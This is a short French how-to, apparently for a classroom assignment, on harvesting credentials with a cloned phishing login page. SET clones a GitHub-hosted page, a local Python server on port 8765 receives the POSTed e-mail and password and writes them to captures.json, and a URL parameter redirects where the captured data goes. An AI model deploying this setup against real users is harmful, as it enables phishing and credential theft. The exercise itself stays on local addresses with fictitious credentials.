# Capture des identifiants (sans dependre du terminal SET)

SET sur le port **80** n'affiche souvent qu'un `GET /` car la page envoie les donnees ailleurs.
Utilise ton **serveur Python** sur le port **8765** pour recevoir le POST.

## Methode recommandee (simple)

**Terminal 1 :**
```powershell
cd c:\Users\benja\Desktop\Perso\bruteforce\Test
python server.py
```

**Navigateur :**
```
http://127.0.0.1:8765/login-simulation.html
```

Parcours : e-mail -> Suivant -> mot de passe -> Suivant.

Tu dois voir dans le terminal :
```text
[CAPTURE] test@eleve.fr / motdepasse123 (depuis 127.0.0.1)
```

Et dans `captures.json`.

## Avec SET + serveur Python (2 terminaux)

**Terminal 1 — SET** (port 80, clone GitHub)

**Terminal 2 :**
```powershell
python server.py
```

1. Pousser la derniere `login-simulation.html` sur GitHub
2. SET clone : `https://bmouchet04.github.io/Test/login-simulation.html`
3. Ouvrir : `http://127.0.0.1/` ou `http://172.17.216.224/` (page SET, port 80)
4. Le POST part automatiquement vers `http://172.17.216.224:8765/api/enregistrer`

SET peut n'afficher que `GET /` — c'est normal. Les identifiants sont dans le terminal **python server.py** et `captures.json`.

## Forcer l'URL de l'API

```
http://172.17.216.224/?api=http://172.17.216.224:8765/api/enregistrer
```

## Ne pas confondre

| URL | Resultat |
|-----|----------|
| GitHub Pages seul | POST vers `:8765` echoue si le serveur Python n'est pas lance |
| `localhost:8765` | Fonctionne directement |
| SET port 80 + `python server.py` | POST vers 8765, capture OK |

Utilise uniquement des identifiants **fictifs** pour le devoir.
